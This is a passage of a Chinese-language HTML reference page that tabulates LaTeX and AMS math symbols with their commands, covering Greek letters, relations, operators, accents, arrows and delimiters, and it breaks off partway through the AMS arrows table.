<h3 id="LaTeX-普通符号"><a href="#LaTeX-普通符号" class="headerlink" title="LaTeX 普通符号"></a>LaTeX 普通符号</h3><h4 id="通用符号"><a href="#通用符号" class="headerlink" title="通用符号"></a>通用符号</h4><table>
<thead>
<tr>
<th>示例</th>
<th>命令</th>
<th>示例</th>
<th>命令</th>
<th>示例</th>
<th>命令</th>
</tr>
</thead>
<tbody><tr>
<td>$\{$</td>
<td>\{</td>
<td>$\}$</td>
<td>\}</td>
<td>$\$$</td>
<td>\ $</td>
</tr>
<tr>
<td>$\%$</td>
<td>\%</td>
<td>$\S$</td>
<td>\S</td>
<td>$\dots$</td>
<td>\dots</td>
</tr>
</tbody></table>
<h4 id="希腊字母"><a href="#希腊字母" class="headerlink" title="希腊字母"></a>希腊字母</h4><table>
<thead>
<tr>
<th>名称</th>
<th>大写</th>
<th>命令</th>
<th>小写</th>
<th>命令</th>
<th>斜体大写</th>
<th>命令</th>
<th>斜体小写</th>
<th>命令</th>
</tr>
</thead>
<tbody><tr>
<td>alpha</td>
<td>$A$</td>
<td>A</td>
<td>$\alpha$</td>
<td>\alpha</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>beta</td>
<td>$B$</td>
<td>B</td>
<td>$\beta$</td>
<td>\beta</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>gamma</td>
<td>$\Gamma$</td>
<td>\Gamma</td>
<td>$\gamma$</td>
<td>\gamma</td>
<td>$\varGamma$</td>
<td>\varGamma</td>
<td></td>
<td></td>
</tr>
<tr>
<td>delta</td>
<td>$\Delta$</td>
<td>\Delta</td>
<td>$\delta$</td>
<td>\delta</td>
<td>$\varDelta$</td>
<td>\varDelta</td>
<td></td>
<td></td>
</tr>
<tr>
<td>epsilon</td>
<td>$E$</td>
<td>E</td>
<td>$\epsilon$</td>
<td>\epsilon</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>zeta</td>
<td>$Z$</td>
<td>Z</td>
<td>$\zeta$</td>
<td>\zeta</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>eta</td>
<td>$H$</td>
<td>H</td>
<td>$\eta$</td>
<td>\eta</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>theta</td>
<td>$\Theta$</td>
<td>\Theta</td>
<td>$\theta$</td>
<td>\theta</td>
<td>$\varTheta$</td>
<td>\varTheta</td>
<td>$\vartheta$</td>
<td>\vartheta</td>
</tr>
<tr>
<td>iota</td>
<td>$I$</td>
<td>I</td>
<td>$\iota$</td>
<td>\iota</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>kappa</td>
<td>$K$</td>
<td>K</td>
<td>$\kappa$</td>
<td>\kappa</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>lambda</td>
<td>$\Lambda$</td>
<td>\Lambda</td>
<td>$\lambda$</td>
<td>\lambda</td>
<td>$\varLambda$</td>
<td>\varLambda</td>
<td></td>
<td></td>
</tr>
<tr>
<td>mu</td>
<td>$M$</td>
<td>M</td>
<td>$\mu$</td>
<td>\mu</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>nu</td>
<td>$N$</td>
<td>N</td>
<td>$\nu$</td>
<td>\nu</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>xi</td>
<td>$\Xi$</td>
<td>\Xi</td>
<td>$\xi$</td>
<td>\xi</td>
<td>$\varXi$</td>
<td>\varXi</td>
<td></td>
<td></td>
</tr>
<tr>
<td>omicron</td>
<td>$O$</td>
<td>O</td>
<td>$\omicron$</td>
<td>\omicron 或 o</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>pi</td>
<td>$\Pi$</td>
<td>\Pi</td>
<td>$\pi$</td>
<td>\pi</td>
<td>$\varPi$</td>
<td>\varPi</td>
<td>$\varpi$</td>
<td>\varpi</td>
</tr>
<tr>
<td>rho</td>
<td>$P$</td>
<td>P</td>
<td>$\rho$</td>
<td>\rho</td>
<td></td>
<td></td>
<td>$\varrho$</td>
<td>\varrho</td>
</tr>
<tr>
<td>sigma</td>
<td>$\Sigma$</td>
<td>\Sigma</td>
<td>$\sigma$</td>
<td>\sigma</td>
<td>$\varSigma$</td>
<td>\varSigma</td>
<td>$\varsigma$</td>
<td>\varsigma</td>
</tr>
<tr>
<td>tau</td>
<td>$T$</td>
<td>T</td>
<td>$\tau$</td>
<td>\tau</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>upsilon</td>
<td>$\Upsilon$</td>
<td>\Upsilon</td>
<td>$\upsilon$</td>
<td>\upsilon</td>
<td>$\varUpsilon$</td>
<td>\varUpsilon</td>
<td></td>
<td></td>
</tr>
<tr>
<td>phi</td>
<td>$\Phi$</td>
<td>\Phi</td>
<td>$\phi$</td>
<td>\phi</td>
<td>$\varPhi$</td>
<td>\varPhi</td>
<td>$\varphi$</td>
<td>\varphi</td>
</tr>
<tr>
<td>chi</td>
<td>$X$</td>
<td>X</td>
<td>$\chi$</td>
<td>\chi</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>psi</td>
<td>$\Psi$</td>
<td>\Psi</td>
<td>$\psi$</td>
<td>\psi</td>
<td>$\varPsi$</td>
<td>\varPsi</td>
<td></td>
<td></td>
</tr>
<tr>
<td>omega</td>
<td>$\Omega$</td>
<td>\Omega</td>
<td>$\omega$</td>
<td>\omega</td>
<td>$\varOmega$</td>
<td>\varOmega</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<ul>
<li>\Alpha, \Beta 等希腊字母符号不存在，因为它们和拉丁字母 A, B 等一模一样；</li>
<li>小写字母里也不存在 \omicron，直接用拉丁字母 o 代替。</li>
</ul>
<h4 id="二元关系符"><a href="#二元关系符" class="headerlink" title="二元关系符"></a>二元关系符</h4><table>
<thead>
<tr>
<th>示例</th>
<th>命令</th>
<th>示例</th>
<th>命令</th>
<th>示例</th>
<th>命令</th>
</tr>
</thead>
<tbody><tr>
<td>$&lt;$</td>
<td>&lt;</td>
<td>$&gt;$</td>
<td>&gt;</td>
<td>$=$</td>
<td>=</td>
</tr>
<tr>
<td>$\leq$</td>
<td>\leq 或 \le</td>
<td>$\geq$</td>
<td>\geq 或 \ge</td>
<td>$\equiv$</td>
<td>\equiv</td>
</tr>
<tr>
<td>$\ll$</td>
<td>\ll</td>
<td>$\gg$</td>
<td>\gg</td>
<td>$\doteq$</td>
<td>\doteq</td>
</tr>
<tr>
<td>$\prec$</td>
<td>\prec</td>
<td>$\succ$</td>
<td>\succ</td>
<td>$\sim$</td>
<td>\sim</td>
</tr>
<tr>
<td>$\preceq$</td>
<td>\preceq</td>
<td>$\succeq$</td>
<td>\succeq</td>
<td>$\simeq$</td>
<td>\simeq</td>
</tr>
<tr>
<td>$\subset$</td>
<td>\subset</td>
<td>$\supset$</td>
<td>\supset</td>
<td>$\approx$</td>
<td>\approx</td>
</tr>
<tr>
<td>$\subseteq$</td>
<td>\subseteq</td>
<td>$\supseteq$</td>
<td>\supseteq</td>
<td>$\cong$</td>
<td>\cong</td>
</tr>
<tr>
<td>$\sqsubset$</td>
<td>\sqsubset</td>
<td>$\sqsupset$</td>
<td>\sqsupset</td>
<td>$\Join$</td>
<td>\Join</td>
</tr>
<tr>
<td>$\sqsubseteq$</td>
<td>\sqsubseteq</td>
<td>$\sqsupseteq$</td>
<td>\sqsupseteq</td>
<td>$\bowtie$</td>
<td>\bowtie</td>
</tr>
<tr>
<td>$\in$</td>
<td>\in</td>
<td>$\ni$</td>
<td>\ni 或 \owns</td>
<td>$\propto$</td>
<td>\propto</td>
</tr>
<tr>
<td>$\vdash$</td>
<td>\vdash</td>
<td>$\dashv$</td>
<td>\dashv</td>
<td>$\models$</td>
<td>\models</td>
</tr>
<tr>
<td>$\mid$</td>
<td>\mid</td>
<td>$\parallel$</td>
<td>\parallel</td>
<td>$\perp$</td>
<td>\perp</td>
</tr>
<tr>
<td>$\smile$</td>
<td>\smile</td>
<td>$\frown$</td>
<td>\frown</td>
<td>$\asymp$</td>
<td>\asymp</td>
</tr>
<tr>
<td>$:$</td>
<td>:</td>
<td>$\notin$</td>
<td>\notin</td>
<td>$\neq$</td>
<td>\neq 或 \ne</td>
</tr>
</tbody></table>
<ul>
<li>所有的二元关系符都可以加<code>\not</code>前缀得到相反意义的关系符，例如<code>\not=</code>就得到不等号（同<code>\ne</code>）。</li>
</ul>
<h4 id="二元运算符"><a href="#二元运算符" class="headerlink" title="二元运算符"></a>二元运算符</h4><table>
<thead>
<tr>
<th>示例</th>
<th>命令</th>
<th>示例</th>
<th>命令</th>
<th>示例</th>
<th>命令</th>
</tr>
</thead>
<tbody><tr>
<td>$+$</td>
<td>+</td>
<td>$-$</td>
<td>-</td>
<td></td>
<td></td>
</tr>
<tr>
<td>$\pm$</td>
<td>\pm</td>
<td>$\mp$</td>
<td>\mp</td>
<td>$\triangleleft$</td>
<td>\triangleleft</td>
</tr>
<tr>
<td>$\cdot$</td>
<td>\cdot</td>
<td>$\div$</td>
<td>\div</td>
<td>$\triangleright$</td>
<td>\triangleright</td>
</tr>
<tr>
<td>$\times$</td>
<td>\times</td>
<td>$\setminus$</td>
<td>\setminus</td>
<td>$\star$</td>
<td>\star</td>
</tr>
<tr>
<td>$\cup$</td>
<td>\cup</td>
<td>$\cap$</td>
<td>\cap</td>
<td>$\ast$</td>
<td>\ast</td>
</tr>
<tr>
<td>$\sqcup$</td>
<td>\sqcup</td>
<td>$\sqcap$</td>
<td>\sqcap</td>
<td>$\circ$</td>
<td>\circ</td>
</tr>
<tr>
<td>$\vee$</td>
<td>\vee 或 \lor</td>
<td>$\wedge$</td>
<td>\wedge 或 \land</td>
<td>$\bullet$</td>
<td>\bullet</td>
</tr>
<tr>
<td>$\oplus$</td>
<td>\oplus</td>
<td>$\ominus$</td>
<td>\ominus</td>
<td>$\diamond$</td>
<td>\diamond</td>
</tr>
<tr>
<td>$\odot$</td>
<td>\odot</td>
<td>$\oslash$</td>
<td>\oslash</td>
<td>$\uplus$</td>
<td>\uplus</td>
</tr>
<tr>
<td>$\otimes$</td>
<td>\otimes</td>
<td>$\bigcirc$</td>
<td>\bigcirc</td>
<td>$\amalg$</td>
<td>\amalg</td>
</tr>
<tr>
<td>$\bigtriangleup$</td>
<td>\bigtriangleup</td>
<td>$\bigtriangledown$</td>
<td>\bigtriangledown</td>
<td>$\dagger$</td>
<td>\dagger</td>
</tr>
<tr>
<td>$\lhd$</td>
<td>\lhd</td>
<td>$\rhd$</td>
<td>\rhd</td>
<td>$\ddagger$</td>
<td>\ddagger</td>
</tr>
<tr>
<td>$\unlhd$</td>
<td>\unlhd</td>
<td>$\unrhd$</td>
<td>\unrhd</td>
<td>$\wr$</td>
<td>\wr</td>
</tr>
</tbody></table>
<h4 id="巨算符"><a href="#巨算符" class="headerlink" title="巨算符"></a>巨算符</h4><table>
<thead>
<tr>
<th>示例</th>
<th>命令</th>
<th>示例</th>
<th>命令</th>
<th>示例</th>
<th>命令</th>
</tr>
</thead>
<tbody><tr>
<td>$\sum$</td>
<td>\sum</td>
<td>$\bigcup$</td>
<td>\bigcup</td>
<td>$\bigvee$</td>
<td>\bigvee</td>
</tr>
<tr>
<td>$\prod$</td>
<td>\prod</td>
<td>$\bigcap$</td>
<td>\bigcap</td>
<td>$\bigwedge$</td>
<td>\bigwedge</td>
</tr>
<tr>
<td>$\coprod$</td>
<td>\coprod</td>
<td>$\bigsqcup$</td>
<td>\bigsqcup</td>
<td>$\biguplus$</td>
<td>\biguplus</td>
</tr>
<tr>
<td>$\int$</td>
<td>\int</td>
<td>$\oint$</td>
<td>\oint</td>
<td>$\bigodot$</td>
<td>\bigodot</td>
</tr>
<tr>
<td>$\bigoplus$</td>
<td>\bigoplus</td>
<td>$\bigotimes$</td>
<td>\bigotimes</td>
<td></td>
<td></td>
</tr>
<tr>
<td>$\iint$</td>
<td>\iint</td>
<td>$\iiint$</td>
<td>\iiint</td>
<td>$\iiiint$</td>
<td>\iiiint</td>
</tr>
<tr>
<td>$\idotsint$</td>
<td>\idotsint</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h4 id="数学重音符号"><a href="#数学重音符号" class="headerlink" title="数学重音符号"></a>数学重音符号</h4><table>
<thead>
<tr>
<th>示例</th>
<th>命令</th>
<th>示例</th>
<th>命令</th>
<th>示例</th>
<th>命令</th>
</tr>
</thead>
<tbody><tr>
<td>$\hat{a}$</td>
<td>\hat{a}</td>
<td>$\check{a}$</td>
<td>\check{a}</td>
<td>$\tilde{a}$</td>
<td>\tilde{a}</td>
</tr>
<tr>
<td>$\acute{a}$</td>
<td>\acute{a}</td>
<td>$\grave{a}$</td>
<td>\grave{a}</td>
<td>$\breve{a}$</td>
<td>\breve{a}</td>
</tr>
<tr>
<td>$\bar{a}$</td>
<td>\bar{a}</td>
<td>$\vec{a}$</td>
<td>\vec{a}</td>
<td>$\mathring{a}$</td>
<td>\mathring{a}</td>
</tr>
<tr>
<td>$\dot{a}$</td>
<td>\dot{a}</td>
<td>$\ddot{a}$</td>
<td>\ddot{a}</td>
<td>$\dddot{a}$</td>
<td>\dddot{a}</td>
</tr>
<tr>
<td>$\ddddot{a}$</td>
<td>\ddddot{a}</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>$\widehat{AAA}$</td>
<td>\widehat{AAA}</td>
<td>$\widetilde{AAA}$</td>
<td>\widetilde{AAA}</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h4 id="箭头"><a href="#箭头" class="headerlink" title="箭头"></a>箭头</h4><table>
<thead>
<tr>
<th>示例</th>
<th>命令</th>
<th>示例</th>
<th>命令</th>
</tr>
</thead>
<tbody><tr>
<td>$\leftarrow$</td>
<td>\leftarrow 或 \gets</td>
<td>$\longleftarrow$</td>
<td>\longleftarrow</td>
</tr>
<tr>
<td>$\rightarrow$</td>
<td>\rightarrow 或 \to</td>
<td>$\longrightarrow$</td>
<td>\longrightarrow</td>
</tr>
<tr>
<td>$\leftrightarrow$</td>
<td>\leftrightarrow</td>
<td>$\longleftrightarrow$</td>
<td>\longleftrightarrow</td>
</tr>
<tr>
<td>$\Leftarrow$</td>
<td>\Leftarrow</td>
<td>$\Longleftarrow$</td>
<td>\Longleftarrow</td>
</tr>
<tr>
<td>$\Rightarrow$</td>
<td>\Rightarrow</td>
<td>$\Longrightarrow$</td>
<td>\Longrightarrow</td>
</tr>
<tr>
<td>$\Leftrightarrow$</td>
<td>\Leftrightarrow</td>
<td>$\Longleftrightarrow$</td>
<td>\Longleftrightarrow</td>
</tr>
<tr>
<td>$\mapsto$</td>
<td>\mapsto</td>
<td>$\longmapsto$</td>
<td>\longmapsto</td>
</tr>
<tr>
<td>$\hookleftarrow$</td>
<td>\hookleftarrow</td>
<td>$\hookrightarrow$</td>
<td>\hookrightarrow</td>
</tr>
<tr>
<td>$\leftharpoondown$</td>
<td>\leftharpoondown</td>
<td>$\rightharpoonup$</td>
<td>\rightharpoonup</td>
</tr>
<tr>
<td>$\leftharpoondown$</td>
<td>\leftharpoondown</td>
<td>$\rightharpoondown$</td>
<td>\rightharpoondown</td>
</tr>
<tr>
<td>$\rightleftharpoons$</td>
<td>\rightleftharpoons</td>
<td>$\iff$</td>
<td>\iff</td>
</tr>
<tr>
<td>$\uparrow$</td>
<td>\uparrow</td>
<td>$\downarrow$</td>
<td>\downarrow</td>
</tr>
<tr>
<td>$\updownarrow$</td>
<td>\updownarrow</td>
<td>$\Uparrow$</td>
<td>\Uparrow</td>
</tr>
<tr>
<td>$\Downarrow$</td>
<td>\Downarrow</td>
<td>$\Updownarrow$</td>
<td>\Updownarrow</td>
</tr>
<tr>
<td>$\nearrow$</td>
<td>\nearrow</td>
<td>$\searrow$</td>
<td>\searrow</td>
</tr>
<tr>
<td>$\swarrow$</td>
<td>\swarrow</td>
<td>$\nwarrow$</td>
<td>\nwarrow</td>
</tr>
<tr>
<td>$\leadsto$</td>
<td>\leadsto</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h4 id="作为重音的箭头符号"><a href="#作为重音的箭头符号" class="headerlink" title="作为重音的箭头符号"></a>作为重音的箭头符号</h4><table>
<thead>
<tr>
<th>示例</th>
<th>命令</th>
<th>示例</th>
<th>命令</th>
</tr>
</thead>
<tbody><tr>
<td>$\overrightarrow{AB}$</td>
<td>\overrightarrow{AB}</td>
<td>$\underrightarrow{AB}$</td>
<td>\underrightarrow{AB}</td>
</tr>
<tr>
<td>$\overleftarrow{AB}$</td>
<td>\overleftarrow{AB}</td>
<td>$\underleftarrow{AB}$</td>
<td>\underleftarrow{AB}</td>
</tr>
<tr>
<td>$\overleftrightarrow{AB}$</td>
<td>\overleftrightarrow{AB}</td>
<td>$\underleftrightarrow{AB}$</td>
<td>\underleftrightarrow{AB}</td>
</tr>
</tbody></table>
<h4 id="定界符"><a href="#定界符" class="headerlink" title="定界符"></a>定界符</h4><table>
<thead>
<tr>
<th>示例</th>
<th>命令</th>
<th>示例</th>
<th>命令</th>
<th>示例</th>
<th>命令</th>
</tr>
</thead>
<tbody><tr>
<td>$($</td>
<td>(</td>
<td>$)$</td>
<td>)</td>
<td>$\uparrow$</td>
<td>\uparrow</td>
</tr>
<tr>
<td>$[$</td>
<td>[ 或 \lbrack</td>
<td>$]$</td>
<td>] 或 \rbrack</td>
<td>$\downarrow$</td>
<td>\downarrow</td>
</tr>
<tr>
<td>$\lbrace$</td>
<td>\{ 或 \lbrace</td>
<td>$\rbrace$</td>
<td>\} 或 \rbrace</td>
<td>$\updownarrow$</td>
<td>\updownarrow</td>
</tr>
<tr>
<td>$\langle$</td>
<td>\langle</td>
<td>$\rangle$</td>
<td>\rangle</td>
<td>$\Uparrow$</td>
<td>\Uparrow</td>
</tr>
<tr>
<td>$\vert$</td>
<td>| 或 \vert</td>
<td>$\Vert$</td>
<td>\| 或 \Vert</td>
<td>$\Downarrow$</td>
<td>\Downarrow</td>
</tr>
<tr>
<td>$/$</td>
<td>/</td>
<td>$\backslash$</td>
<td>\backslash</td>
<td>$\Updownarrow$</td>
<td>\Updownarrow</td>
</tr>
<tr>
<td>$\lfloor$</td>
<td>\lfloor</td>
<td>$\rfloor$</td>
<td>\rfloor</td>
<td></td>
<td></td>
</tr>
<tr>
<td>$\rceil$</td>
<td>\rceil</td>
<td>$\lceil$</td>
<td>\lceil</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h4 id="用于行间公式的大定界符"><a href="#用于行间公式的大定界符" class="headerlink" title="用于行间公式的大定界符"></a>用于行间公式的大定界符</h4><table>
<thead>
<tr>
<th>示例</th>
<th>命令</th>
<th>示例</th>
<th>命令</th>
<th>示例</th>
<th>命令</th>
</tr>
</thead>
<tbody><tr>
<td>$\lgroup$</td>
<td>\lgroup</td>
<td>$\rgroup$</td>
<td>\rgroup</td>
<td>$\lmoustache$</td>
<td>\lmoustache</td>
</tr>
<tr>
<td>$\arrowvert$</td>
<td>\arrowvert</td>
<td>$\Arrowvert$</td>
<td>\Arrowvert</td>
<td>$\bracevert$</td>
<td>\bracevert</td>
</tr>
<tr>
<td>$\rmoustache$</td>
<td>\rmoustache</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h4 id="其它符号"><a href="#其它符号" class="headerlink" title="其它符号"></a>其它符号</h4><table>
<thead>
<tr>
<th>示例</th>
<th>命令</th>
<th>示例</th>
<th>命令</th>
<th>示例</th>
<th>命令</th>
<th>示例</th>
<th>命令</th>
</tr>
</thead>
<tbody><tr>
<td>$\dots$</td>
<td>\dots</td>
<td>$\cdots$</td>
<td>\cdots</td>
<td>$\vdots$</td>
<td>\vdots</td>
<td>$\ddots$</td>
<td>\ddots</td>
</tr>
<tr>
<td>$\hbar$</td>
<td>\hbar</td>
<td>$\imath$</td>
<td>\imath</td>
<td>$\jmath$</td>
<td>\jmath</td>
<td>$\ell$</td>
<td>\ell</td>
</tr>
<tr>
<td>$\Re$</td>
<td>\Re</td>
<td>$\Im$</td>
<td>\Im</td>
<td>$\aleph$</td>
<td>\aleph</td>
<td>$\wp$</td>
<td>\wp</td>
</tr>
<tr>
<td>$\forall$</td>
<td>\forall</td>
<td>$\exists$</td>
<td>\exists</td>
<td>$\mho$</td>
<td>\mho</td>
<td>$\partial$</td>
<td>\partial</td>
</tr>
<tr>
<td>$’$</td>
<td>‘</td>
<td>$\prime$</td>
<td>\prime</td>
<td>$\emptyset$</td>
<td>\emptyset</td>
<td>$\infty$</td>
<td>\infty</td>
</tr>
<tr>
<td>$\nabla$</td>
<td>\nabla</td>
<td>$\triangle$</td>
<td>\triangle</td>
<td>$\Box$</td>
<td>\Box</td>
<td>$\Diamond$</td>
<td>\Diamond</td>
</tr>
<tr>
<td>$\bot$</td>
<td>\bot</td>
<td>$\top$</td>
<td>\top</td>
<td>$\angle$</td>
<td>\angle</td>
<td>$\surd$</td>
<td>\surd</td>
</tr>
<tr>
<td>$\diamondsuit$</td>
<td>\diamondsuit</td>
<td>$\heartsuit$</td>
<td>\heartsuit</td>
<td>$\clubsuit$</td>
<td>\clubsuit</td>
<td>$\spadesuit$</td>
<td>\spadesuit</td>
</tr>
<tr>
<td>$\neg$</td>
<td>\neg 或 \lnot</td>
<td>$\flat$</td>
<td>\flat</td>
<td>$\natural$</td>
<td>\natural</td>
<td>$\sharp$</td>
<td>\sharp</td>
</tr>
</tbody></table>
<h3 id="AMS-符号"><a href="#AMS-符号" class="headerlink" title="AMS 符号"></a>AMS 符号</h3><h4 id="AMS-希腊字母和希伯来字母"><a href="#AMS-希腊字母和希伯来字母" class="headerlink" title="AMS 希腊字母和希伯来字母"></a>AMS 希腊字母和希伯来字母</h4><table>
<thead>
<tr>
<th>示例</th>
<th>命令</th>
<th>示例</th>
<th>命令</th>
<th>示例</th>
<th>命令</th>
<th>示例</th>
<th>命令</th>
<th>示例</th>
<th>命令</th>
</tr>
</thead>
<tbody><tr>
<td>$\digamma$</td>
<td>\digamma</td>
<td>$\varkappa$</td>
<td>\varkappa</td>
<td>$\beth$</td>
<td>\beth</td>
<td>$\gimel$</td>
<td>\gimel</td>
<td>$\daleth$</td>
<td>\daleth</td>
</tr>
</tbody></table>
<h4 id="AMS-二元关系符"><a href="#AMS-二元关系符" class="headerlink" title="AMS 二元关系符"></a>AMS 二元关系符</h4><table>
<thead>
<tr>
<th>示例</th>
<th>命令</th>
<th>示例</th>
<th>命令</th>
<th>示例</th>
<th>命令</th>
</tr>
</thead>
<tbody><tr>
<td>$\lessdot$</td>
<td>\lessdot</td>
<td>$\gtrdot$</td>
<td>\gtrdot</td>
<td>$\doteqdot$</td>
<td>\doteqdot</td>
</tr>
<tr>
<td>$\leqslant$</td>
<td>\leqslant</td>
<td>$\geqslant$</td>
<td>\geqslant</td>
<td>$\risingdotseq$</td>
<td>\risingdotseq</td>
</tr>
<tr>
<td>$\eqslantless$</td>
<td>\eqslantless</td>
<td>$\eqslantgtr$</td>
<td>\eqslantgtr</td>
<td>$\fallingdotseq$</td>
<td>\fallingdotseq</td>
</tr>
<tr>
<td>$\leqq$</td>
<td>\leqq</td>
<td>$\geqq$</td>
<td>\geqq</td>
<td>$\eqcirc$</td>
<td>\eqcirc</td>
</tr>
<tr>
<td>$\lll$</td>
<td>\lll 或 \llless</td>
<td>$\ggg$</td>
<td>\ggg</td>
<td>$\circeq$</td>
<td>\circeq</td>
</tr>
<tr>
<td>$\lesssim$</td>
<td>\lesssim</td>
<td>$\gtrsim$</td>
<td>\gtrsim</td>
<td>$\triangleq$</td>
<td>\triangleq</td>
</tr>
<tr>
<td>$\lessapprox$</td>
<td>\lessapprox</td>
<td>$\gtrapprox$</td>
<td>\gtrapprox</td>
<td>$\bumpeq$</td>
<td>\bumpeq</td>
</tr>
<tr>
<td>$\lessgtr$</td>
<td>\lessgtr</td>
<td>$\gtrless$</td>
<td>\gtrless</td>
<td>$\Bumpeq$</td>
<td>\Bumpeq</td>
</tr>
<tr>
<td>$\lesseqgtr$</td>
<td>\lesseqgtr</td>
<td>$\gtreqless$</td>
<td>\gtreqless</td>
<td>$\thicksim$</td>
<td>\thicksim</td>
</tr>
<tr>
<td>$\lesseqqgtr$</td>
<td>\lesseqqgtr</td>
<td>$\gtreqqless$</td>
<td>\gtreqqless</td>
<td>$\thickapprox$</td>
<td>\thickapprox</td>
</tr>
<tr>
<td>$\preccurlyeq$</td>
<td>\preccurlyeq</td>
<td>$\succcurlyeq$</td>
<td>\succcurlyeq</td>
<td>$\approxeq$</td>
<td>\approxeq</td>
</tr>
<tr>
<td>$\curlyeqprec$</td>
<td>\curlyeqprec</td>
<td>$\curlyeqsucc$</td>
<td>\curlyeqsucc</td>
<td>$\backsim$</td>
<td>\backsim</td>
</tr>
<tr>
<td>$\precsim$</td>
<td>\precsim</td>
<td>$\succsim$</td>
<td>\succsim</td>
<td>$\backsimeq$</td>
<td>\backsimeq</td>
</tr>
<tr>
<td>$\precapprox$</td>
<td>\precapprox</td>
<td>$\succapprox$</td>
<td>\succapprox</td>
<td>$\vDash$</td>
<td>\vDash</td>
</tr>
<tr>
<td>$\subseteqq$</td>
<td>\subseteqq</td>
<td>$\supseteqq$</td>
<td>\supseteqq</td>
<td>$\Vdash$</td>
<td>\Vdash</td>
</tr>
<tr>
<td>$\shortparallel$</td>
<td>\shortparallel</td>
<td>$\Supset$</td>
<td>\Supset</td>
<td>$\Vvdash$</td>
<td>\Vvdash</td>
</tr>
<tr>
<td>$\blacktriangleleft$</td>
<td>\blacktriangleleft</td>
<td>$\sqsupset$</td>
<td>\sqsupset</td>
<td>$\backepsilon$</td>
<td>\backepsilon</td>
</tr>
<tr>
<td>$\vartriangleright$</td>
<td>\vartriangleright</td>
<td>$\because$</td>
<td>\because</td>
<td>$\varpropto$</td>
<td>\varpropto</td>
</tr>
<tr>
<td>$\blacktriangleright$</td>
<td>\blacktriangleright</td>
<td>$\Subset$</td>
<td>\Subset</td>
<td>$\between$</td>
<td>\between</td>
</tr>
<tr>
<td>$\trianglerighteq$</td>
<td>\trianglerighteq</td>
<td>$\smallfrown$</td>
<td>\smallfrown</td>
<td>$\pitchfork$</td>
<td>\pitchfork</td>
</tr>
<tr>
<td>$\vartriangleleft$</td>
<td>\vartriangleleft</td>
<td>$\shortmid$</td>
<td>\shortmid</td>
<td>$\smallsmile$</td>
<td>\smallsmile</td>
</tr>
<tr>
<td>$\trianglelefteq$</td>
<td>\trianglelefteq</td>
<td>$\therefore$</td>
<td>\therefore</td>
<td>$\sqsubset$</td>
<td>\sqsubset</td>
</tr>
</tbody></table>
<h4 id="AMS-二元运算符"><a href="#AMS-二元运算符" class="headerlink" title="AMS 二元运算符"></a>AMS 二元运算符</h4><table>
<thead>
<tr>
<th>示例</th>
<th>命令</th>
<th>示例</th>
<th>命令</th>
<th>示例</th>
<th>命令</th>
</tr>
</thead>
<tbody><tr>
<td>$\dotplus$</td>
<td>\dotplus</td>
<td>$\centerdot$</td>
<td>\centerdot</td>
<td></td>
<td></td>
</tr>
<tr>
<td>$\ltimes$</td>
<td>\ltimes</td>
<td>$\rtimes$</td>
<td>\rtimes</td>
<td>$\divideontimes$</td>
<td>\divideontimes</td>
</tr>
<tr>
<td>$\doublecup$</td>
<td>\doublecup</td>
<td>$\doublecap$</td>
<td>\doublecap</td>
<td>$\smallsetminus$</td>
<td>\smallsetminus</td>
</tr>
<tr>
<td>$\veebar$</td>
<td>\veebar</td>
<td>$\barwedge$</td>
<td>\barwedge</td>
<td>$\doublebarwedge$</td>
<td>\doublebarwedge</td>
</tr>
<tr>
<td>$\boxplus$</td>
<td>\boxplus</td>
<td>$\boxminus$</td>
<td>\boxminus</td>
<td>$\circleddash$</td>
<td>\circleddash</td>
</tr>
<tr>
<td>$\boxtimes$</td>
<td>\boxtimes</td>
<td>$\boxdot$</td>
<td>\boxdot</td>
<td>$\circledcirc$</td>
<td>\circledcirc</td>
</tr>
<tr>
<td>$\intercal$</td>
<td>\intercal</td>
<td>$\circledast$</td>
<td>\circledast</td>
<td>$\rightthreetimes$</td>
<td>\rightthreetimes</td>
</tr>
<tr>
<td>$\curlyvee$</td>
<td>\curlyvee</td>
<td>$\curlywedge$</td>
<td>\curlywedge</td>
<td>$\leftthreetimes$</td>
<td>\leftthreetimes</td>
</tr>
</tbody></table>
<h4 id="AMS-箭头"><a href="#AMS-箭头" class="headerlink" title="AMS 箭头"></a>AMS 箭头</h4><table>
<thead>
<tr>
<th>示例</th>
<th>命令</th>
<th>示例</th>
<th>命令</th>
</tr>
</thead>
<tbody><tr>
<td>$\dashleftarrow$</td>
<td>\dashleftarrow</td>
<td>$\dashrightarrow$</td>
<td>\dashrightarrow</td>
</tr>
<tr>
<td>$\leftleftarrows$</td>
<td>\leftleftarrows</td>
<td>$\rightrightarrows$</td>
<td>\rightrightarrows</td>
</tr>
<tr>
<td>$\leftrightarrows$</td>
<td>\leftrightarrows</td>
<td>$\rightleftarrows$</td>
<td>\rightleftarrows</td>
</tr>
<tr>
<td>$\Lleftarrow$</td>
<td>\Lleftarrow</td>
<td>$\Rrightarrow$</td>
<td>\Rrightarrow</td>
</tr>
<tr>
<td>$\twoheadleftarrow$</td>
<td>\twoheadleftarrow</td>
<td>$\twoheadrightarrow$</td>
<td>\twoheadrightarrow</td>
</tr>
<tr>
<td>$\leftarrowtail$</td>
<td>\leftarrowtail</td>
<td>$\rightarrowtail$</td>
<td>\rightarrowtail</td>
</tr>
<tr>
<td>$\leftrightharpoons$</td>
<td>\leftrightharpoons</td>
<td>$\rightleftharpoons$</td>
<td>\rightleftharpoons</td>
</tr>
<tr>
